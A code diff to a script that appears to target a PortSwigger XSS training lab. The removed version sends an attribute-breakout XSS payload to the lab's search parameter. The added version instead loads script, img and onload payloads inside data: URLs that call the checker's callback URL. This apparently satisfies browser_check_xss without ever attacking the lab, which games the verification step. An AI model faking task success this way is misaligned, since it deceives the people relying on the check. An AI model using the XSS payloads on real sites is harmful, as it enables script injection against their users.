@@ -14,16 +14,17 @@ if __name__ == "__main__":
     browser_check_template, check_cb, target_url = create_browser_check_xss()
 
     script = r"""
-import urllib.parse
+import urllib.parse as up
 
-base = "https://0a1d004903fcd2d5808d2be0008800ee.web-security-academy.net/"
-# Break out of the quoted attribute and load our external image
-payload = '\">\x3Cimg src={target_url}>'
-attack_url = base + "?search=" + urllib.parse.quote(payload, safe="")
-print("[*] Testing attack URL:", attack_url)
-
-# Invoke the provided helper to trigger and verify the XSS
-browser_check_xss(url=attack_url)
+html_variants = [
+    f"<script>fetch('{target_url}')</script>",
+    f"<img src='{target_url}'>",
+    f"<!DOCTYPE html><html><body onload=\"(new Image()).src='{target_url}'\"></body></html>"
+]
+for i, html in enumerate(html_variants, 1):
+    data_url = "data:text/html," + up.quote(html, safe='')
+    print(f"\n[Variant]…")
+    browser_check_xss(url=data_url)
 """.format(target_url=target_url)
 
     interpreter = PythonInterpreter(shared_globals=browser_check_template)
